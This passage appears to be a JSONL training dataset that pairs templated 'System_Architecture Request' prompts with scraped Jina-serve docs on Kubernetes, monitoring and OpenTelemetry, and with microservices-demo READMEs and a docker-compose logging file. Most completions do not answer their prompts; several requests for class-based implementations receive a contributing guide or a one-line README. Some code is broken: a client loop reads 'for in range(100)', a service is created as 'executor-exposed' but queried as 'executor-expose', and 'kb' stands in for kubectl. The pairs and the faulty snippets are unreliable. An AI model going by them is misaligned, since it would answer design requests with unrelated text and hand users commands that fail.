Flow:\n```bash\nkubectl expose deployment executor --name=executor-exposed --type LoadBalancer --port 80 --target-port 8080 -n custom-namespace\nsleep 60 # wait until the external ip is configured\n```\n\nExport the external IP address. This is needed for the client when sending Documents to the Flow in the next section. \n```bash\nexport EXTERNAL_IP=`kubectl get service executor-expose -n custom-namespace -o=jsonpath='{.status.loadBalancer.ingress[0].ip}'`\n```\n\n### Client\nThe client:\n\n- Sends Documents to the exposed service on `$EXTERNAL_IP` \n- Gets the responses.\n\nYou should configure your Client to connect to the service via the external IP address as follows:\n\n```python\nimport os\nfrom typing import List, Optional\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\n\nfrom jina.clients import Client\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass MyDocWithMatches(MyDoc):\n    matches: DocList[MyDoc] = []\n    scores: List[float] = []\n\nhost = os.environ['EXTERNAL_IP']\nport = 80\n\nclient = Client(host=host, port=port)\n\nclient.show_progress = True\ndocs = DocList[MyDoc]([MyDoc(text=f'This is document indexed number {i}') for i in range(100)])\nqueried_docs = client.post(\"/search\", inputs=docs, return_type=DocList[MyDocWithMatches])\n\nmatches = queried_docs[0].matches\nprint(f\"Matched documents: {len(matches)}\")\n```\n\n## Update your Executor in Kubernetes\n\nIn Kubernetes, you can update your Executors by patching the Deployment corresponding to your Executor.\n\nFor instance, in the example above, you can change the CLIPEncoderPrivate's `pretrained_model_name_or_path` parameter by changing the content of the Deployment inside the `executor.yml` dumped by `.to_kubernetes_yaml`.\n\nYou need to add `--uses_with` and pass the batch size argument to it. This is passed to the container inside the Deployment:\n\n```yaml\n    spec:\n      containers:\n      - args:\n        - executor\n        - --name\n        - encoder\n        - --k8s-namespace\n        - custom-namespace\n        - --uses\n        - config.yml\n        - --port\n        - '8080'\n        - --uses-metas\n        - '{}'\n        - --uses-with\n        - '{\"pretrained_model_name_or_path\": \"other_model\"}'\n        - --native\n        command:\n        - jina\n```\n\nAfter doing so, re-apply your configuration so the new Executor will be deployed without affecting the other unchanged Deployments:\n\n```shell script\nkubectl apply -R -f ./k8s_deployment\n```\n\n````{admonition} Other patching options\n:class: seealso\n\nIn Kubernetes Executors are ordinary Kubernetes Deployments, so you can use other patching options provided by Kubernetes:\n\n\n- `kubectl replace` to replace an Executor using a complete configuration file\n- `kubectl patch` to patch an Executor using only a partial configuration file\n- `kubectl edit` to edit an Executor configuration on the fly in your editor\n\nYou can find more information about these commands in the [official Kubernetes documentation](https://kubernetes.io/docs/concepts/cluster-administration/manage-deployment/).\n````\n\n## Key takeaways\n\nIn short, there are just three key steps to deploy Jina on Kubernetes:\n\n1. Use `.to_kubernetes_yaml()` to generate Kubernetes configuration files from a Jina Deployment or Flow object.\n2. Apply the generated file via `kubectl`(Modify the generated files if necessary)\n3. Expose your service outside the K8s cluster\n\n## See also\n- {ref}`Kubernetes support documentation <kubernetes-docs>`\n- {ref}`Monitor service once it is deployed <monitoring>`\n- {ref}`See how failures and retries are handled <flow-error-handling>`\n- {ref}`Learn more about scaling Executors <scale-out>`\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "docs/cloud-nativeness/kubernetes.md", "language": "markdown", "complexity": "complex", "star_count": 21665, "quality_score": 0.98, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 695}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(monitoring)=\n# Prometheus/Grafana Support (Legacy)\n\n```{admonition} Deprecated\n:class: caution\nThe Prometheus-only based feature will soon be deprecated in favor of the OpenTelemetry Setup. Refer to {ref}`OpenTelemetry Setup <opentelemetry>` for the details on OpenTelemetry setup for Jina-serve.\n\nRefer to the {ref}`OpenTelemetry migration guide <opentelemetry-migration>` for updating your existing Prometheus and Grafana configurations.\n```\n\nWe recommend the Prometheus/Grafana stack to leverage the metrics exposed by Jina-serve. In this setup, Jina-serve exposes different metrics, and Prometheus scrapes these endpoints, as well as\ncollecting, aggregating, and storing the metrics. \n\nExternal entities (like Grafana) can access these aggregated metrics via the query language [PromQL](https://prometheus.io/docs/prometheus/latest/querying/basics/) and let users visualize the metrics with dashboards.\n\n\n```{hint} \nJina supports exposing metrics, but you are in charge of installing and managing your Prometheus/Grafana instances.\n```\n\nIn this guide, we deploy the Prometheus/Grafana stack and use it to monitor a Flow.\n\n(deploy-flow-monitoring)=\n## Deploying the Flow and the monitoring stack\n\n### Deploying on Kubernetes\n\nOne challenge of monitoring a {class}`~jina.Flow` is communicating its different metrics endpoints to Prometheus.\nFortunately, the [Prometheus operator for Kubernetes](https://github.com/prometheus-operator/prometheus-operator/blob/main/Documentation/user-guides/getting-started.md) makes this fairly easy because it can automatically discover new metrics endpoints to scrape.\n\nWe recommend deploying your Jina-serve Flow on Kubernetes to leverage the full potential of the monitoring feature because:\n* The Prometheus operator can automatically discover new endpoints to scrape.\n* You can extend monitoring with the rich built-in Kubernetes metrics.\n\nYou can deploy Prometheus and Grafana on your Kubernetes cluster by running:\n\n```bash\nhelm install prometheus prometheus-community/kube-prometheus-stack --set prometheus.prometheusSpec.serviceMonitorSelectorNilUsesHelmValues=false\n```\n```{hint} \nsetting the `serviceMonitorSelectorNilUsesHelmValues` to false allows the Prometheus Operator to discover metrics endpoint outside of the helm scope which is needed to discover the Flow metrics endpoints.\n```\n\nDeploy the Flow that we want to monitor:\n\nFor this example we recommend reading {ref}`how to build and containerize the Executors to be run in Kubernetes. <build-containerize-for-k8s>`\n\n\n````{tab} via YAML\nThis example shows how to start a Flow with monitoring enabled via YAML:\n\nIn a `flow.yaml` file\n```yaml\njtype: Flow\nwith:\n  monitoring: true\nexecutors:\n- uses: jinaai+docker://<user-id>/EncoderPrivate\n```\n\n```bash\njina export kubernetes flow.yml ./config ```\n````\n\n````{tab} via Python API\n```python\nfrom jina import Flow\n\nf = Flow(monitoring=True).add(uses='jinaai+docker://<user-id>/EncoderPrivate')\nf.to_kubernetes_yaml('config')\n```\n````\n\nThis creates a `config` folder containing the Kubernetes YAML definition of the Flow.\n\n```{seealso}\nYou can see in-depth how to deploy a Flow on Kubernetes {ref}`here <kubernetes>`\n```\n\nThen deploy the Flow:\n\n```bash\nkubectl apply -R -f config\n```\n\nWait for a couple of minutes, and you should see that the Pods are ready:\n\n```bash\nkubectl get pods\n```\n\n```{figure} ../../.github/2.0/kubectl_pods.png\n:align: center\n```\n\nThen you can see that the new metrics endpoints are automatically discovered:\n\n```bash\nkubectl port-forward svc/prometheus-operated 9090:9090\n```\n\n```{figure} ../../.github/2.0/prometheus_target.png\n:align: center\n```\nBefore querying the gateway you need to port-forward\n```bash\nkubectl port-forward svc/gateway 8080:8080\n```\n\nTo access Grafana, run:\n\n```bash\nkb port-forward svc/prometheus-grafana 3000:80\n```\n\nThen open `http://localhost:3000` in your browser. The username is `admin` and password is `prom-operator`.\n\nYou should see the Grafana home page.\n\n\n### Deploying locally\n\nDeploy the Flow that we want to monitor:\n\n\n````{tab} via Python code\n```python\nfrom jina import Flow\n\nwith Flow(monitoring=True, port_monitoring=8000, port=8080).add(\n    uses='jinaai+docker://<user-id>/EncoderPrivate', port_monitoring=9000\n) as f:\n    f.block()\n```\n````\n\n````{tab} via docker-compose\n```python\nfrom jina import Flow\n\nFlow(monitoring=True, port_monitoring=8000, port=8080).add(\n    uses='jinaai+docker://<user-id>/EncoderPrivate', port_monitoring=9000\n).to_docker_compose_yaml('config.yaml')\n```\n```bash\ndocker-compose -f config.yaml up\n```\n````\n\nTo monitor a Flow locally you need to install Prometheus and Grafana locally. The easiest way to do this is with\nDocker Compose.\n\nFirst clone the repo which contains the config file:\n\n```bash\ngit clone https://github.com/jina-ai/example-grafana-prometheus\ncd example-grafana-prometheus/prometheus-grafana-local\n```\n\nthen \n\n```bash\ndocker-compose up\n```\n\nAccess the Grafana dashboard at `http://localhost:3000`. The username is `admin` and the password is `foobar`.\n\n```{caution}\nThis example works locally because Prometheus is configured to listen to ports 8000 and 9000. However,\nin contrast to deploying on Kubernetes, you need to tell Prometheus which port to look at. You can change these\nports by modifying [prometheus.yml](https://github.com/jina-ai/example-grafana-prometheus/blob/8baf519f7258da68cfe224775fc90537a749c305/prometheus-grafana-local/prometheus/prometheus.yml#L64).\n```\n\n### Deploying on Jcloud\n\nIf your Flow is deployed on JCloud, you don't need to provision a monitoring stack yourself. Prometheus and Grafana are \nhandled by JCloud and you can find a dashboard URL with `jc status <flow_id>`\n\n## Using Grafana to visualize metrics\n\nAccess the Grafana homepage, then go to `Browse` then `import` and copy and paste the [JSON file](https://github.com/jina-ai/example-grafana-prometheus/blob/main/grafana-dashboards/flow.json) \n\n\nYou should see the following dashboard:\n\n```{figure} ../../.github/2.0/grafana.png\n:align: center\n```\n\n\n````{admonition} Hint\n:class: hint\n\nYou should query your Flow to generate the first metrics. Otherwise the dashboard looks empty.\n````\n\nYou can query the Flow by running:\n\n```python\nfrom typing import Optional\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\nfrom jina import Client\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\nclient = Client(port=51000)\n\nclient.post(on='/', inputs=DocList[MyDoc]([MyDoc(text=f'Text for document {i}') for in range(100)]), return_type=DocList[MyDoc], request_size=10,)\n```\n\n## See also\n\n- [Using Grafana to visualize Prometheus metrics](https://grafana.com/docs/grafana/latest/getting-started/getting-started-prometheus/)\n- {ref}`Defining custom metrics in an Executor <monitoring>`\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "docs/cloud-nativeness/monitoring.md", "language": "markdown", "complexity": "complex", "star_count": 21665, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 218}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(opentelemetry-migration)=\n# Migrate from Prometheus/Grafana to OpenTelemetry\n\nThe {ref}`Prometheus/Grafana <monitoring>` based monitoring setup will soon be deprecated in favor of the {ref}`OpenTelemetry setup <opentelemetry>`. This section provides the details required to update/migrate your Prometheus configuration and Grafana dashboard to continue monitoring with OpenTelemetry. Refer to {ref}`Opentelemetry setup <opentelemetry>` for the new setup before proceeding further.\n\n```{hint}\n:class: seealso\nRefer to {ref}`Prometheus/Grafana-only <monitoring>` section for the soon to be deprecated setup.\n```\n\n## Update Prometheus configuration\n\nWith a Prometheus-only setup, you need to set up a `scrape_configs` configuration or service discovery plugin to specify the targets for pulling metrics data. In the OpenTelemetry setup, each Pod pushes metrics to the OpenTelemetry Collector. The Prometheus configuration now only needs to scrape from the OpenTelemetry Collector to get all the data from OpenTelemetry-instrumented applications.\n\nThe new Prometheus configuration for the `otel-collector` Collector hostname is:\n\n```yaml\nscrape_configs:\n  - job_name: 'otel-collector'\n    scrape_interval: 500ms\n    static_configs:\n      - targets: ['otel-collector:8888'] # metrics from the collector itself\n      - targets: ['otel-collector:8889'] # metrics collected from other applications\n```\n\n## Update Grafana dashboard\n\nThe OpenTelemetry [Histogram](https://opentelemetry.io/docs/reference/specification/metrics/api/#histogram) provides quantile window buckets automatically (unlike the Prometheus [Summary](https://prometheus.io/docs/concepts/metric_types/#summary) instrument). You need to manually configure the required quantile window. The quatile window metric will then be available as a separate time series metric.\n\nIn addition, the OpenTelemetry `Counter/UpDownCounter` instruments do not add the `_total` suffix to the base metric name.\n\nTo adapt Prometheus queries in Grafana:\n- Use the [histogram_quantile](https://prometheus.io/docs/prometheus/latest/querying/functions/#histogram_quantile) function to query the average or desired quantile window time series data from Prometheus. For example, to view the 0.99 quantile of the `jina_receiving_request_seconds` metric over the last 10 minutes, use query `histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[10m]))`.\n- Remove the `_total` prefix from the Counter/UpDownCounter metric names.\n\nYou can download a [sample Grafana dashboard JSON file](https://github.com/jina-ai/example-grafana-prometheus/blob/main/grafana-dashboards/flow-histogram-metrics.json) and import it into Grafana to get started with some pre-built graphs.\n\n```{hint}\nA list of available metrics is in the {ref}`Flow Instrumentation <instrumenting-flow>` section.\n```", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "docs/cloud-nativeness/opentelemetry-migration.md", "language": "markdown", "complexity": "simple", "star_count": 21665, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 40}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(opentelemetry)=\n# {octicon}`telescope-fill` OpenTelemetry Support\n\n```{toctree}\n:hidden:\n\nopentelemetry-migration\nmonitoring\n```\n\n```{hint}\nPrometheus-only based metrics collection will soon be deprecated. Refer to {ref}`Monitor with Prometheus and Grafana <monitoring>` for the old setup.\n```\n\nThere are two major setups required to visualize/monitor your application's signals using [OpenTelemetry](https://opentelemetry.io). The first setup is covered by Jina-serve which integrates the [OpenTelemetry API and SDK](https://opentelemetry-python.readthedocs.io/en/stable/api/index.html) at the application level. The {ref}`Flow Instrumentation <instrumenting-flow>` page covers in detail the steps required to enable OpenTelemetry in a Flow. A {class}`~jina.Client` can also be instrumented which is documented in the {ref}`Client Instrumentation <instrumenting-client>` section.\n\nThis section covers the OpenTelemetry infrastructure setup required to collect, store and visualize the traces and metrics data exported by the Pods. This setup is the user's responsibility, and this section only serves as the initial/introductory guide to running OpenTelemetry infrastructure components.\n\nSince OpenTelemetry is open source and is mostly responsible for the API standards and specification, various providers implement the specification. This section follows the default recommendations from the OpenTelemetry documentation that also fits into the Jina-serve implementations.\n\n## Exporting traces and metrics data\n\nPods created using a {class}`~jina.Flow` with tracing or metrics enabled use the [SDK Exporters](https://opentelemetry.io/docs/instrumentation/python/exporters/) to send the data to a central [Collector](https://opentelemetry.io/docs/collector/) component. You can use this collector to further process and store the data for visualization and alerting. \n\nThe push/export-based mechanism also allows the application to start pushing data immediately on startup. This differs from the pull-based mechanism where you need a separate scraping registry to discovery service to identify data scraping targets.\n\nYou can configure the exporter backend host and port using the `traces_exporter_host`, `traces_exporter_port`, `metrics_exporter_host` and `metrics_exporter_port`. Even though the Collector is metric data-type agnostic (it accepts any type of OpenTelemetry API data model), we provide separate configuration for Tracing and Metrics to give you more flexibility in choosing infrastructure components.\n\nJina-serve's default exporter implementation is  `OTLPSpanExporter` and `OTLPMetricExporter`. The exporters also use the gRPC data transfer protocol. The following environment variables can be used to further configure the exporter client based on your requirements. The full list of exporter related environment variables are documented by the [PythonSDK library](https://opentelemetry-python.readthedocs.io/en/latest/exporter/otlp/otlp.html). Apart from `OTEL_EXPORTER_OTLP_PROTOCOL` and `OTEL_EXPORTER_OTLP_TRACES_ENDPOINT`, you can use all other library version specific environment variables to configure the exporter clients.\n\n\n## Collector\n\nThe [Collector](https://opentelemetry.io/docs/collector/) is a huge ecosystem of components that support features like scraping, collecting, processing and further exporting data to storage backends. The collector itself can also expose endpoints to allow scraping data. We recommend reading the official documentation to understand the the full set of features and configuration required to run a Collector. Read the below section to understand the minimum number of components and the respective configuration required for operating with Jina-serve.\n\nWe recommend using the [OpenTelemetry Collector](https://opentelemetry.io/docs/collector/) from the contrib repository. We also use:\n- [Jaeger](https://www.jaegertracing.io) for collecting traces, visualizing tracing data and alerting based on tracing data.\n- [Prometheus](https://prometheus.io) for collecting metric data and/or alerting.\n- [Grafana](https://grafana.com) for visualizing data from Prometheus/Jaeger and/or alerting based on the data queried.\n\n```{hint}\nJaeger provides a comprehensive out of the box tools for end-to-end tracing monitoring, visualization and alerting. You can substitute other tools to achieve the necessary goals of observability and performance analysis. The same can be said for Prometheus and Grafana.\n```\n\n### Docker Compose\n\nA minimal `docker-compose.yml` file can look like:\n\n```yaml\nversion: \"3\"\nservices:\n  # Jaeger\n  jaeger:\n    image: jaegertracing/all-in-one:latest\n    ports:\n      - \"16686:16686\"\n\n  otel-collector:\n    image: otel/opentelemetry-collector:0.61.0\n    command: [ \"--config=/etc/otel-collector-config.yml\" ]\n    volumes:\n      - ${PWD}/otel-collector-config.yml:/etc/otel-collector-config.yml\n    ports:\n      - \"8888\" # Prometheus metrics exposed by the collector\n      - \"8889\" # Prometheus exporter metrics\n      - \"4317:4317\" # OTLP gRPC receiver\n    depends_on:\n      - jaeger\n\n  prometheus:\n    container_name: prometheus\n    image: prom/prometheus:latest\n    volumes:\n      - ${PWD}/prometheus-config.yml:/etc/prometheus/prometheus.yml\n    ports:\n      - \"9090:9090\"\n\n  grafana:\n    container_name: grafana\n    image: grafana/grafana-oss:latest\n    ports:\n      - 3000:3000\n```\n\nThe corresponding OpenTelemetry Collector configuration below needs to be stored in file `otel-collector-config.yml`:\n```yaml\nreceivers:\n  otlp:\n    protocols:\n      grpc:\n\nexporters:\n  jaeger:\n    endpoint: jaeger:14250\n    tls:\n      insecure: true\n  \n  prometheus:\n    endpoint: \"0.0.0.0:8889\"\n    resource_to_telemetry_conversion:\n      enabled: true\n    # can be used to add additional labels\n    const_labels:\n      label1: value1\n\nprocessors:\n  batch:\n\nservice:\n  extensions: []\n  pipelines:\n    traces:\n      receivers: [otlp]\n      exporters: [jaeger]\n      processors: [batch]\n    metrics:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [prometheus]\n```\n\nThis setup creates a gRPC Collector Receiver on port 4317 that collects data pushed by the Flow Pods. Collector exporters for Jaeger and Prometheus backends are configured to export tracing and metrics data respectively. The final **service** section creates a collector pipeline combining the receiver (collect data) and exporter (to backend), process (batching) sub-components.\n\nThe minimal Prometheus configuration needs to be stored in `prometheus-config.yml`.\n```yaml\nscrape_configs:\n  - job_name: 'otel-collector'\n    scrape_interval: 500ms\n    static_configs:\n      - targets: ['otel-collector:8889']\n      - targets: ['otel-collector:8888']\n```\n\nThe Prometheus configuration now only needs to scrape from the OpenTelemetry Collector to get all the data from OpenTelemetry Metrics instrumented applications.\n\n\n### Running a Flow locally\n\nRun the Flow and a sample request that we want to instrument locally. If the backends are running successfully the Flow has exported data to the Collector which can be queried and viewed.\n\nFirst start a Flow:\n\n```python\nfrom jina import Flow, Executor, requests\nfrom docarray import DocList, BaseDoc\nimport time\n\nclass MyExecutor(Executor):\n    \n    @requests\n    def foo(self, docs: DocList[BaseDoc], **kwargs) -> DocList[BaseDoc]:\n        time.sleep(0.5)\n        return docs\n\nwith Flow(\n    port=54321,\n    tracing=True,\n    traces_exporter_host='http://localhost',\n    traces_exporter_port=4317,\n    metrics=True,\n    metrics_exporter_host='http://localhost',\n    metrics_exporter_port=4317,\n).add(uses=MyExecutor) as f:\n    f.block()\n```\n\nSecond execute requests using the instrumented {class}`jina.Client`:\n\n```python\nfrom jina import Client\nfrom docarray import DocList, BaseDoc\n\nclient = Client(\n    host='grpc://localhost:54321',\n    tracing=True,\n    traces_exporter_host='http://localhost',\n    traces_exporter_port=4317,\n)\nclient.post('/', DocList[BaseDoc]([BaseDoc()]), return_type=DocList[BaseDoc])\nclient.teardown_instrumentation()\n```\n\n```{hint}\nThe {class}`jina.Client` currently only supports OpenTelemetry Tracing.\n```\n\n## Viewing Traces in Jaeger UI\n\nYou can open the Jaeger UI [here](http://localhost:16686). You can find more information on the Jaeger UI in the official [docs](https://www.jaegertracing.io/docs/1.38/external-guides/#using-jaeger).\n\n```{hint}\nThe list of available traces are documented in the {ref}`Flow Instrumentation <instrumenting-flow>` section.\n```\n\n## Monitor with Prometheus and Grafana\n\nExternal entities (like Grafana) can access these aggregated metrics via the [PromQL](https://prometheus.io/docs/prometheus/latest/querying/basics/) query language, and let users visualize metrics with dashboards. Check out a [comprehensive tutorial](https://prometheus.io/docs/visualization/grafana/) for more information.\n\nDownload a [sample Grafana dashboard JSON file](https://github.com/jina-ai/example-grafana-prometheus/blob/main/grafana-dashboards/flow-histogram-metrics.json) and import it into Grafana to get started with some pre-built graphs:\n\n```{figure} ../../.github/2.0/grafana-histogram-metrics.png\n:align: center\n```\n\n```{hint}\n:class: seealso\nA list of available metrics is in the {ref}`Flow Instrumentation <instrumenting-flow>` section.\nTo update your existing Prometheus and Grafana configurations, refer to the {ref}`OpenTelemetry migration guide <opentelemetry-migration>`.\n```\n\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "docs/cloud-nativeness/opentelemetry.md", "language": "markdown", "complexity": "complex", "star_count": 21665, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 211}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contribution guidelines\n\nWe'd love to accept your contributions; large or small. Simply submit an issue or pull request via Github and involve one of the active members. Simple! But please read the rest of this document to ensure we're all on the same page.\n\n##  General Rules\n\n- Be kind and polite. Written language often does not convey the sentiment, so make sure you use lots of jokes and emoticons to get the sentiment across.\n- Prefer best practice. Everyone has their preferred style, but try to conform to current best practices. We don't enforce any strict rules.\n- Test your code to the best of your abilities. See the testing documentation for the correct scope of your test.\n\n## Bug reports or feature requests\n\nPlease open an issue if you have found an issue or have an idea for a new feature. Please follow the bug reporting guidelines if you submit an issue.\n\n## New Contributors\n\nWe have a list of issues on Github with \"HelpWanted\" labels attributed to them. These represent tasks that we don't have time to do, are self-contained and relatively easy to implement. If you'd like to contribute, but don't know where to start, [look here](https://github.com/microservices-demo/microservices-demo/issues?utf8=%E2%9C%93&q=is%3Aissue%20is%3Aopen%20label%3AHelpWanted).\n\n## Direction\n\nThis project does have a general direction, but we're happy to consider deviating or pivoting from the direction we're currently heading. See the introductory material for details regarding direction.\n\nWith that said, there is absolutely nothing stopping you from submitting a PR. If you've taken the effort to contribute, someone will make the effort to review.\n\n## License\n\nThis project is Apache v2.0 licenced. Submitting and merging a PR implies you accept these terms.\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": ".github/CONTRIBUTING.md", "language": "markdown", "complexity": "simple", "star_count": 3709, "quality_score": 0.63, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 28}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "[![Build Status](https://travis-ci.org/microservices-demo/microservices-demo.svg?branch=master)](https://travis-ci.org/microservices-demo/microservices-demo)\n\n# DEPRECATED: Sock Shop : A Microservice Demo Application\n\nThe application is the user-facing part of an online shop that sells socks. It is intended to aid the demonstration and testing of microservice and cloud native technologies.\n\nIt is built using [Spring Boot](http://projects.spring.io/spring-boot/), [Go kit](http://gokit.io) and [Node.js](https://nodejs.org/) and is packaged in Docker containers.\n\nYou can read more about the [application design](./internal-docs/design.md).\n\n## Deployment Platforms\n\nThe [deploy folder](./deploy/) contains scripts and instructions to provision the application onto your favourite platform. \n\nPlease let us know if there is a platform that you would like to see supported.\n\n## Bugs, Feature Requests and Contributing\n\nWe'd love to see community contributions. We like to keep it simple and use Github issues to track bugs and feature requests and pull requests to manage contributions. See the [contribution information](.github/CONTRIBUTING.md) for more information.\n\n## Screenshot\n\n![Sock Shop frontend](https://github.com/microservices-demo/microservices-demo.github.io/raw/master/assets/sockshop-frontend.png)\n\n## Visualizing the application\n\nUse [Weave Scope](http://weave.works/products/weave-scope/) or [Weave Cloud](http://cloud.weave.works/) to visualize the application once it's running in the selected [target platform](./deploy/).\n\n![Sock Shop in Weave Scope](https://github.com/microservices-demo/microservices-demo.github.io/raw/master/assets/sockshop-scope.png)\n\n## \n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "README.md", "language": "markdown", "complexity": "simple", "star_count": 3709, "quality_score": 0.6, "features": {"has_microservices": true, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 32}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Deployment Configurations\n\nSub directories contain scripts and configuration for deployment in target platforms. \n\nWe previously supported other platforms, and you can take a look at them at https://github.com/microservices-demo/user-contribs.\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/README.md", "language": "markdown", "complexity": "simple", "star_count": 3709, "quality_score": 0.43, "features": {"has_microservices": true, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 6}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "See the [documentation](https://microservices-demo.github.io/deployment/docker-compose.html) on how to deploy Sock Shop using Docker Compose.\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/docker-compose/README.md", "language": "markdown", "complexity": "simple", "star_count": 3709, "quality_score": 0.39999999999999997, "features": {"has_microservices": true, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 2}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "version: '2'\n\nservices:\n  elasticsearch:\n    image: elasticsearch\n    hostname: elasticsearch\n  kibana:\n    image: kibana\n    hostname: kibana\n    depends_on:\n      - elasticsearch\n    ports:\n      - '5601:5601'\n  log-server:\n    image: weaveworksdemos/log-server\n    hostname: log-server\n    depends_on:\n      - elasticsearch\n    ports:\n      - '24224:24224'\n  front-end:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  edge-router:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  catalogue:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  catalogue-db:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  carts:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  carts-db:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  orders:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  orders-db:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  shipping:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  queue-master:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  rabbitmq:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  payment:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  user:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  user-db:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n  user-sim:\n    logging:\n      driver: fluentd\n    depends_on:\n      - log-server\n", "metadata": {"source": "github.com/microservices-demo/microservices-demo", "file_path": "deploy/docker-compose/docker-compose.logging.yml", "language": "yaml", "complexity": "simple", "star_count": 3709, "quality_score": 0.63, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 96}, "authority_level": "high", "authentic": true}}
